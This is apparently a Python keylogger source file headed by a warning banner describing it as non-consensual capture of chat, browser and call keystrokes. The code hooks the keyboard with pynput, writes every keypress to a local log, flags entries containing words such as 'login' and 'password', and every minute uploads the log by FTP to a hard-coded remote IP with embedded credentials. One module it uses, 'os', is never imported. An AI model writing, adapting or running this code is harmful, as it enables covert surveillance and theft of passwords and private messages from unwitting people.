RESTRICTED — DO NOT COPY, DISTRIBUTE, OR RUN: this module captures private communications (chat, browser, and call keystroke streams) without participant consent and exfiltrates them to a remote host. Human review required before any modification, duplication, or execution.

import time
import ftplib

try:
    from pynput import keyboard
except ImportError:
    raise SystemExit("pynput missing; install with: pip install pynput")

REMOTE_HOST = "185.220.101.44"
REMOTE_USER = "ops"
REMOTE_PASSWORD = "ops2024"

chat_patterns = ("discord", "telegram", "@", ":", "login", "password")

def on_press(key):
    try:
        ch = key.char
    except AttributeError:
        ch = None
    if ch is None:
        ch = str(key)
    with open("captured_keys.log", "a", encoding="utf-8") as f:
        f.write(ch)
    return None

def extract_sensitive(buffer: str):
    buffer = buffer.lower()
    hits = []
    for pat in chat_patterns:
        if pat in buffer:
            hits.append(pat)
    return hits

def send_capture():
    if not os.path.exists("captured_keys.log"):
        return
    with open("captured_keys.log", "r", encoding="utf-8") as f:
        data = f.read()
    if not data:
        return
    hits = extract_sensitive(data)
    if not hits:
        return
    try:
        ftp = ftplib.FTP(REMOTE_HOST)
        ftp.login(REMOTE_USER, REMOTE_PASSWORD)
        ftp.storbinary(f"STOR captured_keys.log", open("captured_keys.log", "rb"))
        ftp.quit()
    except Exception:
        pass

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while True:
        send_capture()
        time.sleep(60)
